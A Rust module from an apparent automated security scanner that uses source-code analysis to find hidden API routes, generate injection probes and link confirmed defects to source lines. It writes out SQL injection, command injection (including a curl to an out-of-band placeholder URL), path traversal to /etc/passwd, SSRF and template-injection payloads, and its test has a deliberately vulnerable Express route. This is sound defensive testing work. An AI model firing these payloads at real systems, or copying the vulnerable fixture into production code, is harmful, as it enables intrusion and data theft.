//! White-box source-to-exploit bridge.
//!
//! When `--repo` is provided (even without `--diff-base`), consumes the native Tree-sitter AST
//! code inventory (`crate::code_audit`), injects hidden or undocumented backend routes into
//! discovery, synthesizes sink- and guard-targeted exploit probes, and links verified HTTP
//! defects back to exact `file:line` source locations.

use serde_json::json;
use std::collections::{BTreeMap, BTreeSet};
use std::path::PathBuf;

use super::discover::Discovery;
use super::exec::Credentials;
use super::plan::Depth;
use super::triage::{endpoint_template, path_of};
use super::types::{DiscoveredRoute, InputSurface, PlannedCase, ProbeOracle, TriagedDefect};
use crate::code_audit::{DiscoveredEndpoint, SinkKind, audit_tree};

const MAX_INJECTED_ROUTES: usize = 40;
const MAX_HYPOTHESES: usize = 64;

#[derive(Debug, Clone)]
pub struct WhiteboxHypothesis {
    pub method: String,
    pub path: String,
    pub params: Vec<String>,
    pub sink_kind: Option<SinkKind>,
    pub missing_guard: bool,
    pub source_file: String,
    pub line: u32,
    pub handler: String,
    pub rationale: String,
}

#[derive(Debug, Clone, Default)]
pub struct WhiteboxAnalysis {
    pub repo_root: PathBuf,
    pub endpoints_analyzed: usize,
    pub routes_injected: usize,
    pub hypotheses: Vec<WhiteboxHypothesis>,
    pub findings_count: usize,
    pub source_map: BTreeMap<(String, String), String>,
}

/// Normalize Express (`:id`) and Flask/FastAPI (`<int:id>`, `<id>`) path params to `{id}` template form.
pub fn normalize_route_path(raw: &str) -> String {
    let clean = raw.trim().split(['?', '#']).next().unwrap_or("/");
    let mut segs = Vec::new();
    for seg in clean.split('/') {
        if seg.is_empty() {
            continue;
        }
        if let Some(name) = seg.strip_prefix(':') {
            let p = name.trim();
            if !p.is_empty() {
                segs.push(format!("{{{p}}}"));
                continue;
            }
        }
        if let Some(inner) = seg.strip_prefix('<').and_then(|s| s.strip_suffix('>')) {
            let p = inner.rsplit(':').next().unwrap_or(inner).trim();
            if !p.is_empty() {
                segs.push(format!("{{{p}}}"));
                continue;
            }
        }
        segs.push(seg.to_string());
    }
    if segs.is_empty() {
        "/".into()
    } else {
        format!("/{}", segs.join("/"))
    }
}

/// Substitute `{param}` placeholders in a normalized path with concrete probe values.
pub fn concrete_probe_path(normalized: &str) -> String {
    let mut segs = Vec::new();
    for seg in normalized.split('/').filter(|s| !s.is_empty()) {
        if let Some(inner) = seg.strip_prefix('{').and_then(|s| s.strip_suffix('}')) {
            let low = inner.to_ascii_lowercase();
            let sample = if low.contains("file")
                || low.contains("path")
                || low.contains("doc")
                || low.contains("name")
                || low.contains("slug")
                || low.contains("key")
            {
                "report"
            } else {
                "1"
            };
            segs.push(sample.to_string());
        } else {
            segs.push(seg.to_string());
        }
    }
    if segs.is_empty() {
        "/".into()
    } else {
        format!("/{}", segs.join("/"))
    }
}

fn format_endpoint_source(ep: &DiscoveredEndpoint, norm_path: &str, missing_guard: bool) -> String {
    let mut parts = Vec::new();
    let mut sink_labels = BTreeSet::new();
    for s in &ep.sinks {
        let via = if s.via_fn != "<anon>" && s.via_fn != "<top>" && s.via_fn != ep.handler {
            format!(" via {}", s.via_fn)
        } else {
            String::new()
        };
        sink_labels.insert(format!(
            "{} `{}`{via} ({}:{})",
            s.kind.technique_hint(),
            s.callee,
            s.file,
            s.line
        ));
    }
    if !sink_labels.is_empty() {
        parts.push(format!(
            "sinks: {}",
            sink_labels.into_iter().collect::<Vec<_>>().join(", ")
        ));
    }
    if missing_guard {
        parts.push("missing auth guard vs sibling routes".into());
    }
    let detail = if parts.is_empty() {
        String::new()
    } else {
        format!(" [{}]", parts.join("; "))
    };
    format!(
        "{}:{} handler `{}` for {} {}{}",
        ep.file, ep.line, ep.handler, ep.method, norm_path, detail
    )
}

/// Inspect `--repo` using native AST analysis, inject hidden routes into `Discovery`, and collect
/// sink/guard-targeted hypotheses for downstream exploitation and defect linking.
pub fn analyze_and_enrich(
    repo: &str,
    disc: &mut Discovery,
    depth: Depth,
) -> Result<WhiteboxAnalysis, String> {
    let root = super::change::resolve_repo(repo)?;
    if depth == Depth::Quick {
        return Ok(WhiteboxAnalysis {
            repo_root: root,
            ..Default::default()
        });
    }

    let inv = audit_tree(&root);
    let mut missing_guard_keys: BTreeSet<(String, String)> = BTreeSet::new();
    for f in &inv.findings {
        if f.rule == "security.auth.missing_guard"
            && let Some(key) = f.fp_key.as_deref()
            && let Some(rest) = key.strip_prefix("missing_guard|")
            && let Some((m, p)) = rest.split_once('|')
        {
            missing_guard_keys.insert((m.to_ascii_uppercase(), normalize_route_path(p)));
        }
    }

    let mut known_routes: BTreeSet<(String, String)> = disc
        .routes
        .iter()
        .map(|r| (r.method.to_ascii_uppercase(), normalize_route_path(&r.path)))
        .collect();
    if let Some(spec) = &disc.spec {
        for op in &spec.ops {
            let full = format!("{}{}", spec.base_path, op.path);
            known_routes.insert((op.method.to_ascii_uppercase(), normalize_route_path(&full)));
        }
    }

    let mut analysis = WhiteboxAnalysis {
        repo_root: root,
        endpoints_analyzed: inv.endpoints.len(),
        findings_count: inv.findings.len(),
        ..Default::default()
    };

    let mut seen_hyp = BTreeSet::new();
    for ep in &inv.endpoints {
        let method = ep.method.to_ascii_uppercase();
        let norm_path = normalize_route_path(&ep.path);
        let probe_path = concrete_probe_path(&norm_path);
        let tpl_path = endpoint_template(&probe_path);
        let has_missing_guard = missing_guard_keys.contains(&(method.clone(), norm_path.clone()));

        let src_ctx = format_endpoint_source(ep, &norm_path, has_missing_guard);
        analysis
            .source_map
            .insert((method.clone(), tpl_path.clone()), src_ctx.clone());
        analysis
            .source_map
            .insert((method.clone(), norm_path.clone()), src_ctx.clone());
        analysis
            .source_map
            .entry(("*".into(), tpl_path.clone()))
            .or_insert_with(|| src_ctx.clone());

        let is_body_verb = matches!(method.as_str(), "POST" | "PUT" | "PATCH");
        let is_new = known_routes.insert((method.clone(), norm_path.clone()))
            && (probe_path == norm_path
                || known_routes.insert((method.clone(), probe_path.clone())));
        if analysis.routes_injected < MAX_INJECTED_ROUTES && is_new {
            let surface = if is_body_verb {
                InputSurface::Json
            } else if !ep.params.is_empty()
                || !ep.sinks.is_empty()
                || ep.path.contains([':', '{', '<'])
            {
                InputSurface::Query
            } else {
                InputSurface::None
            };
            disc.routes.push(DiscoveredRoute {
                path: probe_path.clone(),
                method: method.clone(),
                status_code: 0,
                content_type: String::new(),
                is_spa_shell: false,
                is_api: true,
                title: Some(format!(
                    "AST handler `{}` ({}:{})",
                    ep.handler, ep.file, ep.line
                )),
                has_form: false,
                secured: if !ep.guards.is_empty() || has_missing_guard {
                    Some(true)
                } else {
                    None
                },
                has_body: is_body_verb,
                source: "code_audit".into(),
                final_url: None,
                redirect_chain: Vec::new(),
                auth_wall: false,
                catch_all: false,
                input_surface: surface,
            });
            analysis.routes_injected += 1;
        }

        if analysis.hypotheses.len() >= MAX_HYPOTHESES {
            continue;
        }

        let mut ep_sink_kinds = BTreeSet::new();
        for s in &ep.sinks {
            if ep_sink_kinds.insert(s.kind)
                && seen_hyp.insert((method.clone(), probe_path.clone(), Some(s.kind), false))
            {
                analysis.hypotheses.push(WhiteboxHypothesis {
                    method: method.clone(),
                    path: probe_path.clone(),
                    params: ep.params.clone(),
                    sink_kind: Some(s.kind),
                    missing_guard: false,
                    source_file: s.file.clone(),
                    line: s.line,
                    handler: ep.handler.clone(),
                    rationale: format!(
                        "AST sink `{}` ({}) reachable from {} {} at {}:{}",
                        s.callee,
                        s.kind.technique_hint(),
                        method,
                        norm_path,
                        s.file,
                        s.line
                    ),
                });
            }
        }

        if has_missing_guard && seen_hyp.insert((method.clone(), probe_path.clone(), None, true)) {
            analysis.hypotheses.push(WhiteboxHypothesis {
                method: method.clone(),
                path: probe_path.clone(),
                params: ep.params.clone(),
                sink_kind: None,
                missing_guard: true,
                source_file: ep.file.clone(),
                line: ep.line,
                handler: ep.handler.clone(),
                rationale: format!(
                    "Handler `{}` for {} {} lacks auth guard present on sibling routes ({}:{})",
                    ep.handler, method, norm_path, ep.file, ep.line
                ),
            });
        }
    }

    Ok(analysis)
}

fn default_param_for(kind: SinkKind) -> &'static str {
    match kind {
        SinkKind::SqlInjection => "q",
        SinkKind::CommandExec => "host",
        SinkKind::Ssrf => "url",
        SinkKind::PathTraversal => "file",
        SinkKind::ServerSideTemplate => "template",
    }
}

fn choose_param(h: &WhiteboxHypothesis, kind: SinkKind) -> &str {
    let hint_match = h.params.iter().find(|p| {
        let l = p.to_ascii_lowercase();
        match kind {
            SinkKind::SqlInjection => matches!(
                l.as_str(),
                "q" | "query" | "search" | "filter" | "name" | "id" | "user" | "email" | "sort"
            ),
            SinkKind::CommandExec => {
                matches!(
                    l.as_str(),
                    "host" | "cmd" | "exec" | "command" | "target" | "ip"
                )
            }
            SinkKind::Ssrf => {
                matches!(
                    l.as_str(),
                    "url" | "uri" | "callback" | "webhook" | "dest" | "next"
                )
            }
            SinkKind::PathTraversal => {
                matches!(
                    l.as_str(),
                    "file" | "path" | "doc" | "template" | "name" | "dir"
                )
            }
            SinkKind::ServerSideTemplate => {
                matches!(
                    l.as_str(),
                    "template" | "tpl" | "name" | "msg" | "message" | "render"
                )
            }
        }
    });
    hint_match
        .map(String::as_str)
        .or_else(|| h.params.first().map(String::as_str))
        .unwrap_or_else(|| default_param_for(kind))
}

#[allow(clippy::too_many_arguments)]
fn build_case(
    title: String,
    method: &str,
    path: String,
    technique: &str,
    input_hint: String,
    payload: Option<String>,
    expected_behavior: &str,
    expected_status: Option<u16>,
    risk_level: &str,
    role: Option<String>,
    secured: Option<bool>,
    probe_oracle: Option<ProbeOracle>,
) -> PlannedCase {
    PlannedCase {
        id: String::new(),
        title,
        component: path,
        method: method.to_string(),
        technique: technique.to_string(),
        input_hint,
        payload,
        headers: Vec::new(),
        content_type: None,
        probe_oracle,
        expected_behavior: expected_behavior.to_string(),
        expected_status,
        risk_level: risk_level.to_string(),
        role,
        secured,
        route_status: None,
        expect_fields: Vec::new(),
        expected_content_type: None,
        source: Some("deterministic".into()),
        stateful_steps: None,
        concurrency_burst: None,
        contract: None,
        changed_ops: Vec::new(),
        area: String::new(),
        regression_of: Vec::new(),
        history_priority: false,
    }
}

/// Convert AST-backed sink and missing-guard hypotheses into prioritized `PlannedCase`s.
pub fn plan_whitebox_cases(
    wb: &WhiteboxAnalysis,
    creds: &Credentials,
    depth: Depth,
) -> Vec<PlannedCase> {
    if depth == Depth::Quick || wb.hypotheses.is_empty() {
        return Vec::new();
    }
    let cap = match depth {
        Depth::Quick => 0,
        Depth::Standard => 24,
        Depth::Deep => 48,
    };
    let actor = creds.actor();
    let mut out = Vec::new();

    for h in &wb.hypotheses {
        if out.len() >= cap {
            break;
        }
        if h.missing_guard {
            out.push(build_case(
                format!(
                    "White-box unguarded {} {} authz check ({}:{})",
                    h.method, h.path, h.source_file, h.line
                ),
                &h.method,
                h.path.clone(),
                "authz",
                h.rationale.clone(),
                None,
                "Endpoint missing authentication guard must reject unauthenticated requests with 401/403",
                Some(401),
                "high",
                Some("anon".into()),
                Some(true),
                None,
            ));
        }

        let Some(kind) = h.sink_kind else {
            continue;
        };
        let param = choose_param(h, kind);
        let mk_pl = |val: &str| json!({ param: val }).to_string();

        match kind {
            SinkKind::SqlInjection => {
                let baseline = mk_pl("test");
                let true_pl = mk_pl("test' OR '1'='1");
                let false_pl = mk_pl("test' AND '1'='2");
                out.push(build_case(
                    format!(
                        "White-box SQLi differential on {} {} (`{}` @ {}:{})",
                        h.method, h.path, param, h.source_file, h.line
                    ),
                    &h.method,
                    h.path.clone(),
                    "injection",
                    h.rationale.clone(),
                    Some(true_pl),
                    "SQL sink must use parameterized queries rather than concatenating request input",
                    None,
                    "critical",
                    actor.clone(),
                    None,
                    Some(ProbeOracle::BooleanDiff {
                        baseline_payload: baseline.clone(),
                        false_payload: false_pl,
                    }),
                ));
                if out.len() < cap {
                    out.push(build_case(
                        format!(
                            "White-box SQLi error/syntax probe on {} {} (`{}` @ {}:{})",
                            h.method, h.path, param, h.source_file, h.line
                        ),
                        &h.method,
                        h.path.clone(),
                        "injection",
                        h.rationale.clone(),
                        Some(mk_pl("' OR '1'='1' --")),
                        "SQL sink must reject or safely parameterize quote payloads without 5xx errors",
                        None,
                        "high",
                        actor.clone(),
                        None,
                        None,
                    ));
                }
                if depth == Depth::Deep && out.len() < cap {
                    out.push(build_case(
                        format!(
                            "White-box time-based SQLi on {} {} (`{}` @ {}:{})",
                            h.method, h.path, param, h.source_file, h.line
                        ),
                        &h.method,
                        h.path.clone(),
                        "injection",
                        h.rationale.clone(),
                        Some(mk_pl("1' OR SLEEP(3)-- ")),
                        "Input must not induce database execution delays",
                        None,
                        "critical",
                        actor.clone(),
                        None,
                        Some(ProbeOracle::TimeDelay {
                            baseline_payload: baseline,
                            min_delay_ms: 2500,
                        }),
                    ));
                }
            }
            SinkKind::CommandExec => {
                let baseline = mk_pl("127.0.0.1");
                out.push(build_case(
                    format!(
                        "White-box command injection delay on {} {} (`{}` @ {}:{})",
                        h.method, h.path, param, h.source_file, h.line
                    ),
                    &h.method,
                    h.path.clone(),
                    "injection",
                    h.rationale.clone(),
                    Some(mk_pl("127.0.0.1; sleep 3")),
                    "Command execution sink must never run shell separators supplied by caller",
                    None,
                    "critical",
                    actor.clone(),
                    None,
                    Some(ProbeOracle::TimeDelay {
                        baseline_payload: baseline,
                        min_delay_ms: 2500,
                    }),
                ));
                if depth == Depth::Deep && out.len() < cap {
                    out.push(build_case(
                        format!(
                            "White-box command injection OAST on {} {} (`{}` @ {}:{})",
                            h.method, h.path, param, h.source_file, h.line
                        ),
                        &h.method,
                        h.path.clone(),
                        "injection",
                        h.rationale.clone(),
                        Some(mk_pl("127.0.0.1; curl {{OAST_URL}}")),
                        "Command execution sink must not invoke outbound shell fetches",
                        None,
                        "critical",
                        actor.clone(),
                        None,
                        Some(ProbeOracle::OastCallback {
                            placeholder: "{{OAST_URL}}".into(),
                            wait_ms: 800,
                        }),
                    ));
                }
            }
            SinkKind::Ssrf => {
                out.push(build_case(
                    format!(
                        "White-box SSRF OAST probe on {} {} (`{}` @ {}:{})",
                        h.method, h.path, param, h.source_file, h.line
                    ),
                    &h.method,
                    h.path.clone(),
                    "injection",
                    h.rationale.clone(),
                    Some(mk_pl("{{OAST_URL}}")),
                    "Outbound HTTP client sink must enforce URL allowlists and block arbitrary fetches",
                    None,
                    "critical",
                    actor.clone(),
                    None,
                    Some(ProbeOracle::OastCallback {
                        placeholder: "{{OAST_URL}}".into(),
                        wait_ms: 800,
                    }),
                ));
            }
            SinkKind::PathTraversal => {
                out.push(build_case(
                    format!(
                        "White-box path traversal on {} {} (`{}` @ {}:{})",
                        h.method, h.path, param, h.source_file, h.line
                    ),
                    &h.method,
                    h.path.clone(),
                    "injection",
                    h.rationale.clone(),
                    Some(mk_pl("../../../../etc/passwd")),
                    "Filesystem sink must canonicalize paths and prevent escaping base directories",
                    None,
                    "critical",
                    actor.clone(),
                    None,
                    None,
                ));
                if depth == Depth::Deep && out.len() < cap {
                    out.push(build_case(
                        format!(
                            "White-box double-encoded path traversal on {} {} (`{}` @ {}:{})",
                            h.method, h.path, param, h.source_file, h.line
                        ),
                        &h.method,
                        h.path.clone(),
                        "injection",
                        h.rationale.clone(),
                        Some(mk_pl("..%252f..%252f..%252fetc%252fpasswd")),
                        "Encoded traversal sequences must not bypass path normalization",
                        None,
                        "critical",
                        actor.clone(),
                        None,
                        None,
                    ));
                }
            }
            SinkKind::ServerSideTemplate => {
                out.push(build_case(
                    format!(
                        "White-box SSTI probe on {} {} (`{}` @ {}:{})",
                        h.method, h.path, param, h.source_file, h.line
                    ),
                    &h.method,
                    h.path.clone(),
                    "injection",
                    h.rationale.clone(),
                    Some(mk_pl("{{1337*79}}")),
                    "Template sink must not evaluate attacker-controlled template expressions",
                    None,
                    "critical",
                    actor.clone(),
                    None,
                    Some(ProbeOracle::Ssti {
                        expected_eval: "105623".into(),
                    }),
                ));
            }
        }
    }
    out.truncate(cap);
    out
}

impl WhiteboxAnalysis {
    /// Attach discovered source `file:line` context onto any matching HTTP `TriagedDefect`.
    pub fn annotate_defects(&self, defects: &mut [TriagedDefect]) {
        if self.source_map.is_empty() {
            return;
        }
        for d in defects {
            if d.source_context.is_some() {
                continue;
            }
            let raw = path_of(&d.component);
            let tpl = endpoint_template(&normalize_route_path(raw));
            let hit = self
                .source_map
                .iter()
                .find(|((_, p), _)| *p == tpl || *p == normalize_route_path(raw))
                .map(|(_, ctx)| ctx.clone());
            if let Some(ctx) = hit {
                d.source_context = Some(ctx);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent::budget::RunBudget;
    use crate::agent::exec::Credentials;
    use crate::agent::pipeline::{LlmMode, RunOptions, run_with};
    use crate::agent::report::{generate_agent_html_report, generate_agent_markdown_report};
    use crate::agent::types::AgentRunRequest;
    use axum::extract::Query;
    use axum::http::StatusCode;
    use axum::routing::{delete, get, post};
    use axum::{Json, Router};
    use serde_json::json;
    use std::collections::HashMap;
    use std::sync::mpsc;
    use std::time::Duration;
    use tokio::net::TcpListener;

    #[test]
    fn normalize_and_concrete_route_paths() {
        assert_eq!(normalize_route_path("/api/users/:id/"), "/api/users/{id}");
        assert_eq!(
            normalize_route_path("/api/orders/<int:order_id>"),
            "/api/orders/{order_id}"
        );
        assert_eq!(
            concrete_probe_path("/api/users/{id}/files/{file}"),
            "/api/users/1/files/report"
        );
    }

    #[test]
    fn hidden_repo_route_is_discovered_exploited_and_linked_to_source() {
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap();
            rt.block_on(async move {
                let app = Router::new()
                    .route(
                        "/",
                        get(|| async {
                            (
                                StatusCode::OK,
                                [(axum::http::header::CONTENT_TYPE, "text/html; charset=utf-8")],
                                "<html><body><a href=\"/api/items\">Items</a></body></html>",
                            )
                        }),
                    )
                    .route(
                        "/api/items",
                        get(|| async { Json(json!({"items": ["a", "b"]})) }),
                    )
                    .route(
                        "/api/items",
                        post(|| async {
                            (StatusCode::UNAUTHORIZED, Json(json!({"error": "auth"})))
                        }),
                    )
                    // Hidden route not linked in HTML and no OpenAPI spec served.
                    .route(
                        "/api/internal/export",
                        get(|Query(q): Query<HashMap<String, String>>| async move {
                            let query = q.get("q").map(String::as_str).unwrap_or("");
                            if query.contains("' OR '1'='1") {
                                Json(json!({
                                    "rows": [
                                        {"id": 1, "secret": "s1"},
                                        {"id": 2, "secret": "s2"},
                                        {"id": 3, "secret": "s3"},
                                        {"id": 4, "secret": "s4"}
                                    ],
                                    "count": 4
                                }))
                            } else if query.contains("' AND '1'='2") {
                                Json(json!({ "rows": [], "count": 0 }))
                            } else {
                                Json(json!({ "rows": [{"id": 1, "secret": "s1"}], "count": 1 }))
                            }
                        }),
                    )
                    // Unprotected destructive admin route missing requireAuth present on sibling routes.
                    .route(
                        "/api/admin/reset",
                        delete(|| async { Json(json!({"reset": true})) }),
                    );

                let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
                let addr = listener.local_addr().unwrap();
                tx.send(format!("http://127.0.0.1:{}", addr.port()))
                    .unwrap();
                axum::serve(listener, app).await.unwrap();
            });
        });
        let base_url = rx.recv().unwrap();

        let nonce = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        let repo = std::env::temp_dir().join(format!("rh-wb-repo-{nonce}"));
        let run_base = std::env::temp_dir().join(format!("rh-wb-run-{nonce}"));
        std::fs::create_dir_all(repo.join("src")).unwrap();
        std::fs::create_dir_all(&run_base).unwrap();
        std::fs::write(
            repo.join("src/server.ts"),
            r#"import express from "express";
const app = express();
app.get("/api/items", requireAuth, listItems);
app.post("/api/items", requireAuth, createItem);
app.delete("/api/admin/reset", (req, res) => res.json({ reset: true }));
app.get("/api/internal/export", (req, res) => {
    const q = req.query.q;
    return db.query("SELECT * FROM users WHERE name = '" + q + "'");
});
"#,
        )
        .unwrap();

        let req = AgentRunRequest {
            target: base_url,
            profile: "standard".into(),
            spec_url: None,
            custom_instructions: None,
            max_steps: None,
            dry_run: false,
            thinking: false,
            model_tier: "balanced".into(),
            thinking_budget_tokens: 1024,
            repo: Some(repo.display().to_string()),
            diff_base: None,
        };
        let budget = RunBudget::new(80, 200, Duration::from_secs(60), 0.0);
        let opts = RunOptions {
            budget,
            credentials: Credentials::default(),
            llm: LlmMode::Off,
            reruns: 0,
            verify_k: 2,
            request_timeout: Duration::from_secs(5),
            lookup_requester_ip: false,
            workers: 2,
            memory_dir: None,
        };

        let rep = run_with(&run_base, &req, "wb-test", opts, Some(true)).unwrap();
        let _ = std::fs::remove_dir_all(&repo);
        let _ = std::fs::remove_dir_all(&run_base);

        assert!(
            rep.discovered_routes
                .iter()
                .any(|r| r.path == "/api/internal/export" && r.source == "code_audit"),
            "hidden route must be injected from repo AST: {:?}",
            rep.discovered_routes
        );
        let sqli = rep
            .triaged_defects
            .iter()
            .find(|d| {
                d.component.contains("/api/internal/export") && d.rule == "blind_boolean_injection"
            })
            .unwrap_or_else(|| {
                panic!(
                    "expected confirmed blind SQLi on hidden /api/internal/export; defects={:?}",
                    rep.triaged_defects
                )
            });
        assert!(sqli.verified, "whitebox SQLi must verify cleanly");
        assert!(
            sqli.source_context
                .as_deref()
                .is_some_and(|s| s.contains("src/server.ts")),
            "expected source_context pointing to src/server.ts: {:?}",
            sqli.source_context
        );
        assert!(
            rep.triaged_defects
                .iter()
                .any(|d| d.component.contains("/api/admin/reset") && d.rule == "authz"),
            "expected unauthenticated DELETE bypass defect on /api/admin/reset: {:?}",
            rep.triaged_defects
        );
        let md = generate_agent_markdown_report(&rep);
        let html = generate_agent_html_report(&rep);
        assert!(md.contains("src/server.ts"), "markdown should link source");
        assert!(html.contains("src/server.ts"), "html should link source");
    }
}
